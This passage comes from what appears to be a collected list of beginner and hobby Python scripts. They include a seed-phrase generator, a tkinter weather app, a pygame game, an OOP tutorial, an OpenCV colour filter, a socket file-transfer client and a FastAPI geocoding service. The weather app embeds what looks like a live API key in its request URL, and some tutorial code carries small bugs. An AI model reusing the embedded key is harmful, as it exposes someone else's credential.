Necesitamos los primeos 4 bits del binario para el checksum.\n\nsha256decimal = int(sha256hash, 16) #hexa decimal\nsha256hashbin = bin(sha256decimal)[2:] #decimal binary\n#print (sha256hashbin)\n\nchecksum = (sha256hashbin[0:4])\n#print (checksum)\n\nlastfullword =int((lastpalabrabinary+checksum),2)\nseed.append(wordlist[lastfullword])\n\nprint('Tu semilla es ' + ' '.join(seed))",
    "import os\r\nimport time\r\nfrom PIL import Image\r\n\r\nstart_time = time.time()\r\n# D\u00e9finissez le r\u00e9pertoire contenant les images\r\ndossier_images = \"Parallel_Programming/Image_reader/images/200k\"\r\n\r\n# Obtenez la liste de tous les fichiers d'image dans le dossier\r\nfichiers_images = [f for f in os.listdir(dossier_images) if f.lower().endswith((\".jpg\", \".jpeg\"))]\r\n\r\n# Triez les fichiers d'image par ordre alphab\u00e9tique\r\nfichiers_images.sort()\r\nstart_time2 = time.time()\r\n# Lisez et traitez chaque image s\u00e9quentiellement\r\nfor fichier_image in fichiers_images:\r\n    chemin_image = os.path.join(dossier_images, fichier_image)\r\n    image = Image.open(chemin_image)\r\n    # Traitez l'image (par exemple, affichez sa taille)\r\n    #print(f\"Lecture de l'image : {fichier_image}, taille : {image.size}\")\r\nend_time2 = time.time()\r\nend_time = time.time()\r\nexe_time = end_time - start_time\r\nexe_time2 = end_time2 - start_time2\r\nvitesse = len(fichiers_images) / exe_time2\r\n# Affichez un message de r\u00e9ussite\r\nprint(f\"Lettura di {len(fichiers_images)} immagini sequenzialmente.\")\r\nprint(\"Tempo di execuzione della funzione: \", exe_time2, \"secondi\")\r\nprint(\"Tempo di execuzione del programma: \", exe_time, \"secondi\")\r\nprint(f\"Velocita' di lettura delle immagini: {vitesse} immagini/secondo\")\r\ndel chemin_image\r\ndel image\r\ndel fichiers_images",
    "import sys\nsys.path.append(\"../\")\nsys.path.append(\"../..\")\nsys.path.append(\"/usr/src/bert\")\nimport numpy as np\nfrom datetime import datetime\nimport gc\nimport logging\nimport os\nimport pandas as pd\nimport torch\nfrom data_structure.question import Question, QuestionDataset,TensorQuestionDataset\nfrom util.util import get_files_paths_from_directory, save_check_point, load_check_point, seed_everything, write_tensor_board\nfrom util.data_util import get_dataloader, get_distribued_dataloader, load_tenor_data_to_dataset,load_data_to_dataset\nfrom model.loss import loss_fn\nfrom train import get_optimizer, get_optimizer_scheduler, get_train_args, init_train_env, get_exe_name\nfrom apex.parallel import DistributedDataParallel as DDP\nfrom torch.optim import AdamW\nfrom transformers import BertConfig, get_linear_schedule_with_warmup\nfrom torch.utils.tensorboard import SummaryWriter\n\nlogger = logging.getLogger(__name__)\n\ndef log_train_info(args):\n    logger.info(\"***** Running training *****\")\n    logger.info(\"  Num Epochs = %d\", args.num_train_epochs)\n    logger.info(\"  Instantaneous batch size per GPU = %d\",\n                args.per_gpu_train_batch_size)\n    logger.info(\n        \"  Total train batch size (w. parallel, distributed & accumulation) = %d\",\n        args.train_batch_size\n        * args.gradient_accumulation_steps\n        * (torch.distributed.get_world_size() if args.local_rank != -1 else 1),\n    )\n    logger.info(\"  Gradient Accumulation steps = %d\",\n                args.gradient_accumulation_steps)\n\n\ndef train(args, model):\n    files = get_files_paths_from_directory(args.data_folder)\n    \n    if not args.exp_name:\n        exp_name = get_exe_name(args)\n    else:\n        exp_name = args.exp_name\n\n    # total training examples 10279014\n    args.train_batch_size = args.per_gpu_train_batch_size * max(1, args.n_gpu)\n    train_numbers = args.train_numbers\n    epoch_batch_num = train_numbers / args.train_batch_size\n    t_total = epoch_batch_num // args.gradient_accumulation_steps * args.num_train_epochs\n    optimizer = get_optimizer(args,model)\n    \n    # make output directory\n    args.output_dir = os.path.join(args.output_dir, exp_name)\n    if not os.path.isdir(args.output_dir):\n        os.makedirs(args.output_dir)\n    if args.local_rank in [-1, 0]:\n        tb_writer = SummaryWriter(log_dir=\"../runs/{}\".format(exp_name))\n    \n    if args.fp16:\n        try:\n            from apex import amp\n        except ImportError:\n            raise ImportError(\"Please install apex from https://www.github.com/nvidia/apex to use fp16 training.\")\n        model, optimizer = amp.initialize(model, optimizer, opt_level=args.fp16_opt_level)\n    scheduler = get_linear_schedule_with_warmup(\n        optimizer, num_warmup_steps=args.warmup_steps, num_training_steps=t_total\n    )\n    logger.info(\"n_gpu: {}\".format(args.n_gpu))\n    if args.n_gpu > 1:\n        model = torch.nn.DataParallel(model)\n\n    # Distributed training (should be after apex fp16 initialization)\n    if args.local_rank != -1:\n        model = DDP(model, delay_allreduce=True)\n\n\n    if args.model_path and os.path.exists(args.model_path):\n        model.load_state_dict(torch.load(args.model_path))\n        logger.info(\"model loaded\")\n    log_train_info(args)\n    args.global_step = 0\n        \n    torch.cuda.empty_cache()\n    gc.collect()\n    for epoch in range(args.num_train_epochs):\n        logger.info(\n            '############# Epoch {}: Training Start   #############'.format(epoch))\n        for file_cnt in range(len(files)):\n            # Load dataset and dataloader\n            train_dataset = load_tenor_data_to_dataset(args.mlb, files[file_cnt])     \n            if args.local_rank == -1:\n                train_data_loader = get_dataloader(\n                    train_dataset, args.train_batch_size)\n            else: \n                train_data_loader = get_distribued_dataloader(\n                    train_dataset, args.train_batch_size)    \n            tr_loss = 0\n            model.train()\n            model.zero_grad()\n            for step, data in enumerate(train_data_loader):\n                title_ids = data['titile_ids'].to(\n                    args.device, dtype=torch.long)\n                title_mask = data['title_mask'].to(\n                    args.device, dtype=torch.long)\n                code_ids = data['code_ids'].to(args.device, dtype=torch.long)\n                code_mask = data['code_mask'].to(args.device, dtype=torch.long)\n                targets = data['labels'].to(args.device, dtype=torch.float)\n                outputs = model(title_ids=title_ids,\n                                title_attention_mask=title_mask,\n                                code_ids=code_ids,\n                                code_attention_mask=code_mask)\n\n                loss = loss_fn(outputs, targets)\n                if args.gradient_accumulation_steps > 1:\n                    loss = loss / args.gradient_accumulation_steps\n                if args.fp16:\n                    try:\n                        f",
    "import tkinter as tk\r\nimport requests\r\nimport time\r\n \r\ndef getWeather(canvas):\r\n    city = textField.get()\r\n    api = \"https://api.openweathermap.org/data/2.5/weather?q=\" + city + \"&appid=870decfffe126c77cb2a22b9212e168b\"\r\n    \r\n    json_data = requests.get(api).json()\r\n    condition = json_data['weather'][0]['main']\r\n    temp = int(json_data['main']['temp'] - 273.15)\r\n    min_temp = int(json_data['main']['temp_min'] - 273.15)\r\n    max_temp = int(json_data['main']['temp_max'] - 273.15)\r\n    pressure = json_data['main']['pressure']\r\n    humidity = json_data['main']['humidity']\r\n    wind = json_data['wind']['speed']\r\n    sunrise = time.strftime('%I:%M:%S', time.gmtime(json_data['sys']['sunrise'] - 21600))\r\n    sunset = time.strftime('%I:%M:%S', time.gmtime(json_data['sys']['sunset'] - 21600))\r\n\r\n    final_info = condition + \"\\n\" + str(temp) + \"\u00b0C\" \r\n    final_data = \"\\n\"+ \"Min Temp: \" + str(min_temp) + \"\u00b0C\" + \"\\n\" + \"Max Temp: \" + str(max_temp) + \"\u00b0C\" +\"\\n\" + \"Pressure: \" + str(pressure) + \"\\n\" +\"Humidity: \" + str(humidity) + \"\\n\" +\"Wind Speed: \" + str(wind) + \"\\n\" + \"Sunrise: \" + sunrise + \"\\n\" + \"Sunset: \" + sunset\r\n    label1.config(text = final_info)\r\n    label2.config(text = final_data)\r\n\r\n\r\ncanvas = tk.Tk()\r\ncanvas.geometry(\"600x500\")\r\ncanvas.title(\"Weather App\")\r\nf = (\"poppins\", 15, \"bold\")\r\nt = (\"poppins\", 35, \"bold\")\r\n\r\ntextField = tk.Entry(canvas, justify='center', width = 20, font = t)\r\ntextField.pack(pady = 20)\r\ntextField.focus()\r\ntextField.bind('<Return>', getWeather)\r\n\r\nlabel1 = tk.Label(canvas, font=t)\r\nlabel1.pack()\r\nlabel2 = tk.Label(canvas, font=f)\r\nlabel2.pack()\r\ncanvas.mainloop()",
    "import os\nimport sys\nimport pygame\n\n\npygame.init()\n\n\n\nHEALTH_FONT = pygame.font.SysFont('comicsans', 40)\nWINNER_FONT = pygame.font.SysFont('comicsans', 100)\n\nYELLOW_HIT = pygame.USEREVENT + 1\nRED_HIT = pygame.USEREVENT+2\n\nWIDTH=1500\nHEIGHT=800\n\nSPACE_WIDTH=70\nSPACE_HEIGHT=60\n\nBULLET_VEL=12\nSPACE_SPEED=10\n\nWINDOW_SCREEN=(WIDTH,HEIGHT)\n\nwall=pygame.Rect(WIDTH/2-10,0,20,HEIGHT)\n\n\nwindow =pygame.display.set_mode(WINDOW_SCREEN)\n\npygame.display.set_caption('Trial Game')\n\nYELLOW_SPACE_IMAGE=pygame.image.load(os.path.join('Assets','spaceship_yellow.png'))\nRED_SPACE_IMAGE=pygame.image.load(os.path.join('Assets','spaceship_red.png'))\n\nBACKGROUND_IMAGE=pygame.image.load(os.path.join('Assets','space.png'))\nbackground= pygame.transform.scale(BACKGROUND_IMAGE, (WIDTH, HEIGHT))\n\nYELLOW_SPACE=pygame.transform.rotate(pygame.transform.scale(YELLOW_SPACE_IMAGE,(SPACE_WIDTH,SPACE_HEIGHT)),90)\nRED_SPACE=pygame.transform.rotate(pygame.transform.scale(RED_SPACE_IMAGE,(SPACE_WIDTH,SPACE_HEIGHT)),-90)\n\nred_space=RED_SPACE.get_rect()\n\nred_space.x=WIDTH-70\nred_space.y=HEIGHT//2\n\nyellow_space=YELLOW_SPACE.get_rect()\nyellow_space.x=0\nyellow_space.y=HEIGHT//2\n\n\ndef red_movement(keys_pressed,red_space):\n    if keys_pressed[pygame.K_UP] and red_space.y>0:\n        red_space.y -= SPACE_SPEED\n\n    if keys_pressed[pygame.K_LEFT] and red_space.left > wall.right:\n        red_space.x -=SPACE_SPEED\n\n    if keys_pressed[pygame.K_RIGHT] and red_space.right < WIDTH:\n        red_space.x += SPACE_SPEED\n\n    if keys_pressed[pygame.K_DOWN] and red_space.bottom < HEIGHT:\n        red_space.y += SPACE_SPEED\n\n\ndef yellow_movement(keys_pressed,yellow_space):\n    if keys_pressed[pygame.K_w] and yellow_space.top > 0:\n        yellow_space.y -= SPACE_SPEED\n\n    if keys_pressed[pygame.K_a] and yellow_space.left > 0:\n        yellow_space.x -=SPACE_SPEED\n\n    if keys_pressed[pygame.K_d] and yellow_space.right < wall.left:\n        yellow_space.x += SPACE_SPEED\n\n    if keys_pressed[pygame.K_s] and yellow_space.bottom < HEIGHT:\n        yellow_space.y += SPACE_SPEED\n\n\nYELLOW = (255, 255, 0)\nRED = (255, 0, 0)\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\n\ndef handle_bullets(red,red_bullets,yellow,yellow_bullets):\n    if len(red_bullets) > 0:\n        for bullet in red_bullets:\n            bullet.x -= BULLET_VEL\n            pygame.draw.ellipse(window, RED, bullet)        \n\n            if bullet.x < 0:\n                red_bullets.remove(bullet)\n            elif yellow.colliderect(bullet):\n                red_bullets.remove(bullet)\n                pygame.event.post(pygame.event.Event(RED_HIT))\n            else:\n                for yellow_bullet in yellow_bullets:\n                    if bullet.colliderect(yellow_bullet):\n                        red_bullets.remove(bullet)\n                        yellow_bullets.remove(yellow_bullet)\n                        print(\"Bullet collision!\")\n\n\n    if len(yellow_bullets)>0:\n        for bullet in yellow_bullets:\n            bullet.x += BULLET_VEL\n            pygame.draw.ellipse(window, YELLOW, bullet)\n\n            if bullet.x > WIDTH:\n                yellow_bullets.remove(bullet)\n            elif red.colliderect(bullet):\n                pygame.event.post(pygame.event.Event(YELLOW_HIT))\n                yellow_bullets.remove(bullet)\n            else:\n                for red_bullet in red_bullets:\n                    if bullet.colliderect(red_bullet):\n                        yellow_bullets.remove(bullet)\n                        red_bullets.remove(red_bullet)\n                        print(\"Bullet collision!\")\n\ndef draw(red_health, yellow_health):\n    red_health_text = HEALTH_FONT.render(\n            \"Health: \" + str(red_health), 1, WHITE)\n    yellow_health_text = HEALTH_FONT.render(\n            \"Health: \" + str(yellow_health), 1, WHITE)\n    window.blit(red_health_text, (WIDTH - red_health_text.get_width() - 10, 10))\n    window.blit(yellow_health_text, (10, 10))\n\n\ndef draw_winner(text):\n    draw_text = WINNER_FONT.render(text, 1, WHITE)\n    window.blit(draw_text, (WIDTH/2 - draw_text.get_width() /\n                            2, HEIGHT/2 - draw_text.get_height()/2))\n    pygame.display.update()\n    pygame.time.delay(5000)\n\n\n\ndef main():\n    # bullets store\n    red_bullets=[]\n    yellow_bullets=[]\n\n    clock = pygame.time.Clock()\n\n    # players health\n    red_health = 10\n    yellow_health = 10\n\n    running=True\n    while running:\n\n        clock.tick(60)\n\n        # Handle events\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                running = False\n                pygame.quit()\n\n            if event.type == pygame.KEYDOWN:\n                if event.key==pygame.K_RCTRL and len(red_bullets) <= 14:\n                    bullet=pygame.Rect(red_space.x+red_space.width,red_space.y+red_space.height,10,10)\n                    red_bullets.append(bullet)\n\n                if event.key==pygame.K_LCTRL and len(yellow_bullets) <= 14:\n                    bullet=pygame.Rect(yellow_space.x+yellow_space.width,yellow_space.y+yel",
    "import random\r\n\r\ndef get_user_choice():\r\n    while True:\r\n        user_choice = input(\"Enter your choice (Rock, Paper, or Scissors): \").strip().lower()\r\n        if user_choice in ['rock', 'paper', 'scissors']:\r\n            return user_choice\r\n        else:\r\n            print(\"Invalid choice. Please enter Rock, Paper, or Scissors.\")\r\n\r\ndef get_computer_choice():\r\n    return random.choice(['rock', 'paper', 'scissors'])\r\n\r\ndef determine_winner(user_choice, computer_choice):\r\n    if user_choice == computer_choice:\r\n        return \"It's a tie!\"\r\n    elif (user_choice == 'rock' and computer_choice == 'scissors') or \\\r\n         (user_choice == 'paper' and computer_choice == 'rock') or \\\r\n         (user_choice == 'scissors' and computer_choice == 'paper'):\r\n        return \"You win!\"\r\n    else:\r\n        return \"Computer wins!\"\r\ndef main():\r\n    print(\"Welcome to Rock-Paper-Scissors!\")\r\n    \r\n    while True:\r\n        user_choice = get_user_choice()\r\n        computer_choice = get_computer_choice()\r\n        \r\n        print(f\"You chose: {user_choice}\")\r\n        print(f\"Computer chose: {computer_choice}\")\r\n        \r\n        result = determine_winner(user_choice, computer_choice)\r\n        print(result)\r\n        \r\n        play_again = input(\"Do you want to play again? (yes/no): \").strip().lower()\r\n        if play_again != 'yes':\r\n            break\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "import psutil\n\ndef get_ram_usage():\n    \"\"\"\n    Function to get RAM (memory) utilization information.\n    \"\"\"\n    # Get memory usage statistics\n    memory = psutil.virtual_memory()\n\n    # Total physical memory (RAM) in bytes\n    total_memory = memory.total\n    # Available memory in bytes\n    available_memory = memory.available\n    # Used memory in bytes\n    used_memory = memory.used\n    # Percentage of used memory\n    used_memory_percentage = memory.percent\n\n    # Convert memory sizes from bytes to human-readable format (MB)\n    total_memory_mb = total_memory / (1024 * 1024)\n    available_memory_mb = available_memory / (1024 * 1024)\n    used_memory_mb = used_memory / (1024 * 1024)\n\n    # Convert memory in percentages %\n    available_memory_percent = ((total_memory_mb-used_memory_mb)/total_memory_mb)*100\n    \n    # Print RAM utilization information\n    print(\"Total Memory: {:.2f} MB\".format(total_memory_mb))\n    print(\"Available Memory: {:.2f} MB\".format(available_memory_mb))\n    print(\"Used Memory: {:.2f} MB\".format(used_memory_mb))\n    print(\"Used Memory Percentage: {:.2f}%\".format(used_memory_percentage))\n    print(\"Available Memory Percentage: {:.2f}%\".format(available_memory_percent))\n\nif __name__ == \"__main__\":\n    # Call the function to get RAM utilization information\n    get_ram_usage()\n\n",
    "# 1.class,object\n# 2.inheritance\n# 3.encapsulation\n# 4.abstract class\n# 5.polymorphism\n# 6. constructor\n# 7.instance attribute   \n# 8.composition\n# 9.decorator\n# 10.getter_setter\n# 11.inner_function\n# 12.override\n# 13.staticattribute\n\n\n# class\nclass phone:\n    price =10000\n    color=\"blue\"\n    brand=\"samsung\"\n# object\nmy_phone=phone()\nprint(my_phone)    \nprint(my_phone.color)\nprint(my_phone.brand)\n\nclass calculator:\n    name=\"casio Es_999fx\"\n    def add(self,n1,n2):\n        add=n1+n2\n        return add\nmy_calculator=calculator()\nprint(my_calculator.add(3,4))\n\n\n# constructor\nclass phone1:\n    manufactured=\"China\"\n    def __init__(self,owner,brand,price):\n        self.owner=owner\n        self.brand=brand\n        self.price=price\n    def send_sms(self,phone,sms):\n        text=f\"sedning to sms {phone} in text {sms}\" \n        print(text)\n\nmy_phone1=phone1('mohabbat','oppo',10000)\nprint(my_phone1.owner,my_phone1.brand,my_phone1.price)\nmy_phone1.send_sms('01788939870','Hello, this is a test message!')\n# method \n# firstly printed from object \n# just printed object instructions\n\n# instance attributes\nclass shop:\n    shapping_mall=\"jumuna_mall\"\n    def __init__(self,buyer) -> None:\n        self.buyer = buyer\n        self.chart=[]\n        \n    # or\n    # chart=[] #class attribute\n    # def __init__(self,buyer):\n    #     self.buyer=buyer\n    def add_to_chart(self,item):\n        self.chart.append(item)\n\nbuyer_person=shop(\"ezekiel\")\nbuyer_person.add_to_chart('shoes')\nbuyer_person.add_to_chart('shirt')\nprint(f\"{buyer_person} puchess {buyer_person.chart} in {buyer_person.shapping_mall}\")\n\n# self.name=attributes,name=parameters\n\n# representaion\n# __repr__(self) -> str:: This is a special method in Python classes. It stands for \u201crepresentation\u201d and is used to define how an object of the class should be represented as a string when printed. When you call print(ali) in your code, Python will look for the __repr__ method to determine what string representation to display.\n# redability,debugging.consistancy \nclass stuedent:\n    def __init__(self,name,cls,id):\n        self.name=name\n        self.cls=cls\n        self.id=id\n\n    def __repr__(self)->str:\n        return f'student name: {self.name},class: {self.cls},id: {self.id}'\n\nali=stuedent('mehmed',10,1)\nprint(ali)\n\n# school\nclass shopping:\n\n    def __init__(self,name):\n        self.name=name\n        self.chart=[]\n\n    def add_to_chart(self,item,price,quantity):\n        product={'item':item,'price':price,'quantity':quantity}\n        self.chart.append(product)\n\n    def remove_item(self,item_name):\n        for item in self.chart:\n            if item['item'] == item_name: #item['item']=item name\n                self.chart.remove(item_name)\n                print(f'{item_name} removed from the chart.')\n                return \n            print(f'{item_name} not found in the chart.')\n\n    def checkout(self,amount):\n        total=0\n        for item in self.chart:\n            total+=item['price']*item['quantity']\n        print('tatal price:',total)\n        if(amount<total):\n            print(f'please provide {total-amount} more.')\n        else:\n            extra=amount-total\n            print(f'herer are your item and extra money: {extra}')\n            self.chart.clear()\n\nezekiel=shopping(\"ezekiel\")\nezekiel.add_to_chart('alu',59,6)\nezekiel.add_to_chart('kodu',60,2)\nezekiel.add_to_chart('law',87,9)\nprint(ezekiel.chart)\n\nezekiel.checkout(600)\n# [{'item': 'alu', 'price': 50, 'quantity': 6}, {'item': 'dim', 'price': 50, 'quantity': 6}, {'item': 'rice', 'price': 50, 'quantity': 6}]  \n# Total price: 900\n# Please provide 300 more.\n\n\n# abstract base class\n# Abstract base classes are used to define a common interface for a group of related classes.\n        # It has a constructor (__init__) that takes a name argument.\n        # It calls the parent class\u2019s constructor using super().__init__().\n\nfrom abc import ABC,abstractmethod\nclass animal(ABC):\n    @abstractmethod\n    def eat(self):\n        pass\n    def move(self):\n        pass\n\nclass monkey(animal):\n    def __init__(self) -> None:\n        self.name=\"monkey\"\n        super().__init__()\n\n    def eat(self):\n        print(\"Eating banana\")\n\n\n# encapsulation\n#encapsulation used for information hiding,public,ptotected & private accessing\n\nclass bank:\n    def __init__(self,holder_name,initial_deposit) -> None:\n        self.holder_name=holder_name\n        self._branch=\"banani\"\n        self.__balance=initial_deposit\n    \n    def deposit(self,amount):\n        if amount > 0:\n            self.__balance += amount\n        print(f'Your current balance: {self.balance}')\n\n    def get_balance(self):\n        return self.__balance\n    \nmehmed=bank(\"mehmed\",100000)\nprint(mehmed._bank__balance)    \n\n\n# inheritance\n# Types of Inheritance:\n# Single Inheritance: A child class inherits from a single parent class.\n# Multiple Inheritance: A child class inherits from multiple parent classes.\n# Multilevel Inheritance: A child class inherits from another child class (forming ",
    "#Programa com Python e OpenCV que identifica e mostra cores em imagens e v\u00eddeos.\n\n#Ao rodar, o programa abre a webcam e consegue identificar as cores verde e amarelo, \n# pois s\u00e3o as \u00fanicas m\u00e1scaras que est\u00e3o configuradas at\u00e9 o momento.\n\n#Importando as bibliotecas\n\nimport cv2\nimport argparse  # O m\u00f3dulo para fazer a An\u00e1lise de Linha de Comando \nfrom operator import xor # Opera\u00e7\u00e3o XOR bit a bit \n\n# As fun\u00e7\u00e3o def - ir\u00e1 agrupar um conjunto de instru\u00e7\u00f5es em um bloco, \n# permitindo que esse bloco seja executado quantas vezes forem necess\u00e1rias.\n\ndef callback(value):\n    pass\n\n# Fun\u00e7\u00e3o setup_trackbar(), o primeiro argumento \u00e9 o nome do trackbar, \n# o segundo \u00e9 o nome da janela \u00e0 qual est\u00e1 anexado, \n# o terceiro argumento \u00e9 o valor padr\u00e3o, o quarto \u00e9 o valor m\u00e1ximo \n# e o quinto \u00e9 a fun\u00e7\u00e3o de retorno de chamada que \u00e9 executada \n# toda vez que o trackbar altera\u00e7\u00f5es de valor.\n\n\n\ndef setup_trackbars(range_filter):\n    cv2.namedWindow(\"Trackbars\", 0)\n\n    for i in [\"MIN\", \"MAX\"]:  //loop para os valores m\u00e1ximos e m\u00ednimos \n        v = 0 if i == \"MIN\" else 255\n\n        for j in range_filter:\n            cv2.createTrackbar(\"%s_%s\" % (j, i), \"Trackbars\", v, 255, callback)\n\n# A fun\u00e7\u00e3o que chama os argumentos \n# Analisador sint\u00e1tico para op\u00e7\u00f5es de linha de comando, argumentos e subcomandos\n\ndef get_arguments():\n    ap = argparse.ArgumentParser()\n    ap.add_argument('-f', '--filter', required=True,\n                    help='Range filter. RGB or HSV')\n    ap.add_argument('-i', '--image', required=False,\n                    help='Path to the image')\n    ap.add_argument('-w', '--webcam', required=False,\n                    help='Use webcam', action='store_true')\n    ap.add_argument('-p', '--preview', required=False,\n                    help='Show a preview of the image after applying the mask',\n                    action='store_true')\n    args = vars(ap.parse_args())\n\n    if not xor(bool(args['image']), bool(args['webcam'])):\n        ap.error(\"Please specify only one image source\")\n\n    if not args['filter'].upper() in ['RGB', 'HSV']:\n        ap.error(\"Please speciy a correct filter.\")\n\n    return args\n\n\ndef get_trackbar_values(range_filter):\n    values = []\n\n    for i in [\"MIN\", \"MAX\"]:\n        for j in range_filter:\n            v = cv2.getTrackbarPos(\"%s_%s\" % (j, i), \"Trackbars\")\n            values.append(v)\n\n    return values\n\n# O ponto de entrada padr\u00e3o do programa\n\ndef main():\n    args = get_arguments()\n\n    range_filter = args['filter'].upper()\n\n    if args['image']:\n        image = cv2.imread(args['image'])\n\n        if range_filter == 'RGB':\n            frame_to_thresh = image.copy()\n        else:\n            frame_to_thresh = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)\n    else:\n        camera = cv2.VideoCapture(0)\n\n    setup_trackbars(range_filter)\n\n    while True:\n        if args['webcam']:\n            ret, image = camera.read()\n\n            if not ret:\n                break\n\n            if range_filter == 'RGB':\n                frame_to_thresh = image.copy()\n            else:\n                frame_to_thresh = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)\n\n        v1_min, v2_min, v3_min, v1_max, v2_max, v3_max = get_trackbar_values(range_filter)\n\n        thresh = cv2.inRange(frame_to_thresh, (v1_min, v2_min, v3_min), (v1_max, v2_max, v3_max))\n\n        if args['preview']:\n            preview = cv2.bitwise_and(image, image, mask=thresh)\n            cv2.imshow(\"Preview\", preview)\n        else:\n            cv2.imshow(\"Original\", image)\n            cv2.imshow(\"Thresh\", thresh)\n\n        if cv2.waitKey(1) & 0xFF is ord('q'):\n            break\n\n\nif __name__ == '__main__':\n    main()\n",
    "import socket\nimport sys\nimport threading\nimport queue\nimport pickle\n# import PySimpleGUI as sg\n# Messages for Gil\n# I think we need to look into using something like json for file transfer\n# The reason for this is becase the basic sockets can only send bytes and with json it would make the format much easier\n# the pickels should be fine but I'll test later\n#\n# The client currently sends a single image and the receiver client will get that message and write it out\n# This has yet to be tested but will be.\n\n\ndef make_server_socket(ip, port):\n    # This function will be used to create a socket and connect to server\n    # Try is used to make sure the user given infomation is correct\n    try:\n        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        tcp_socket.connect((ip,port))\n    except socket.error as e:\n        print(e)\n        print('Incorrect ip or port server information')\n        sys.exit(2)\n        \n    print(\"Connected to server!\\n\")\n    return tcp_socket\n\ndef client_to_client_thread(client_to_client_port):\n    tcp_server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    try:\n        # will need to be the machine IP in the future\n        tcp_server_socket.bind(('127.0.0.1', client_to_client_port))  # Start listening!\n    except socket.error as e:\n        print('Port is busy at the moment.\\nTry again later')\n        sys.exit(2)\n    tcp_server_socket.listen(10)  # 10 is the max number of queued connections allowed\n    while True:\n        client_socket, addr = tcp_server_socket.accept()\n        message = client_socket.recv(50000)\n        message_queue.put(message)\n\ndef initial_message(server_socket):\n    # Have to use bytes but is of form hostname, ip\n    to_be_sent = hostname + ', ' + ip\n    server_socket.sendall(to_be_sent.encode('utf-8'))\n\ndef get_client_list_from_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.connect((server_ip,server_port))\n    server_socket.sendall(b'sendlist')\n    #sendable_client_list = server_socket.recv(4096)\n    # Unpickle the data\n    data = b\"\"\n    sendable_client_list = server_socket.recv(4096)\n    if not sendable_client_list:\n        return\n    data += sendable_client_list\n    print(data)\n    # data = pickle.loads(data)\n    # make it a list\n    data = [data]\n    return data\n\ndef view_and_send_clients():\n    client_list = get_client_list_from_server()\n    for client in client_list:\n        print(client)\n    client_selection = input('Enter the IP of the host you would like to send to\\n>> ')\n    \n    test_file_name = 'fightstick.png'\n    print('Message to be sent is ' + test_file_name)\n    with open(test_file_name, 'rb') as imagefile:\n        imagedata = imagefile.read()\n    \n    try:\n        # Sends the image to the client\n        # image needs the filename and file ext put in the message somewhere\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        client_socket.connect((client_selection,client_to_client_port))\n        client_socket.sendall(imagedata)\n        # Sends a history message to the server\n        history_message = hostname + ', ' + ip + ', ' + test_file_name\n        server_socket.sendall(history_message.encode('utf-8'))\n        client_socket.close()\n    except socket.error as e:\n        print('Not a correct IP')\n        \ndef get_message():        \n    if not message_queue.empty():\n        message = message_queue.get()\n        return message\n    else:\n        return None\n        \ndef view_messages():\n    message = get_message()\n    if message == None:\n        print('No messages have been sent to you')\n        return\n    with open('test-file-send.png', 'wb') as imagefile:\n        imagefile.write(message)\n    print('Image received has been saved')\n        \ndef view_history():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.connect((server_ip,server_port))\n    server_socket.sendall(b'sendhistory')\n    history_list = server_socket.recv(50000)\n    history_list = [history_list]\n    \n    for hist in history_list:\n        print(hist)\n        \ndef main():\n    while True:\n        \n        user_input = input('User menu (Enter exit to end)\\n1-View and send to clients:\\n2-View Messages\\n3-View History\\n>> ')\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('127.0.0.1', 8888))\n                    \n        match user_input:\n            case '1': view_and_send_clients()\n            case '2': view_messages()\n            case '3': view_history()\n            case 'exit': sys.exit()\n            case _: print('Incorrect input')\n        \n        sock.send(user_input.encode()) \n        dataServer = sock.recv(100)\n        # print(\"Message from server: \" + dataServer.decode())\n\nif __name__ == '__main__':    \n    server_ip = '127.0.0.1'\n    server_port = 8888\n    hostname = 'client1'\n    message_queue = queue.Queue()\n    \n    ip = socket.gethostbyname(socket.gethostname())\n    client_to_client_port = 8",
    "from fastapi import FastAPI, Depends, HTTPException\nfrom sqlalchemy import create_engine, Column, Integer, String, Float\nimport sqlalchemy\nfrom sqlalchemy.orm import sessionmaker, Session\nfrom pydantic import BaseModel\nimport googlemaps\nfrom geopy.distance import geodesic\n\napp = FastAPI()\n\nDATABASE_URL = 'sqlite:///./database.db'\nengine = create_engine(DATABASE_URL)\nSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)\nBase = sqlalchemy.orm.declarative_base()\n\ngmaps = googlemaps.Client(key='YOUR KEY')\n\nclass City(Base):\n    __tablename__ = \"cities\"\n    id = Column(Integer, primary_key=True, index=True)\n    name = Column(String, index=True)\n    latitude = Column(Float)\n    longitude = Column(Float)\n\nBase.metadata.create_all(bind=engine)\n\ndef get_db():\n    db = SessionLocal()\n    try:\n        yield db\n    finally:\n        db.close()\n\nclass CityAdd(BaseModel):\n    name: str\n    # latitude: float\n    # longitude: float\n\nclass CityResponse(BaseModel):\n    id: int\n    name: str\n    latitude: float\n    longitude: float\n    distance: float\n\nclass NearestCity(BaseModel):\n    latitude: float\n    longitude: float\n\n@app.get('/')\ndef index():\n    return {'info':'go to localhost/docs'}\n\n# @app.post('/cities/', response_model=CityResponse)\n# async def create_city(city:CityAdd, db:Session = Depends(get_db)):\n#     db_city = City(**city.model_dump())\n#     db.add(db_city)\n#     db.commit()\n#     db.refresh(db_city)\n#     return db_city\n@app.post('/cities/')\nasync def create_city(city_data: CityAdd):\n    result = gmaps.geocode(city_data.name)\n    if not result:\n        raise HTTPException(status_code=404, detail='City not found')\n\n    location = result[0]['geometry']['location']\n    latitude = location['lat']\n    longitude = location['lng']\n\n    db = SessionLocal()\n    db_city = City(name=city_data.name, latitude=latitude, longitude=longitude)\n    db.add(db_city)\n    db.commit()\n    db.refresh(db_city)\n    db.close()\n    return {'city': city_data.name, 'latitude':latitude, 'longitude':longitude}\n\n@app.get('/cities/{city_id}', response_model=CityResponse)\nasync def get_city(city_id:int, db:Session=Depends(get_db)):\n    db_city = db.query(City).filter(City.id==city_id).first()\n    if db_city is None:\n        raise HTTPException(status_code=404, detail='City not found')\n    return db_city\n\n@app.get('/cities/', response_model=CityResponse)\nasync def get_city_by_name(name:str, 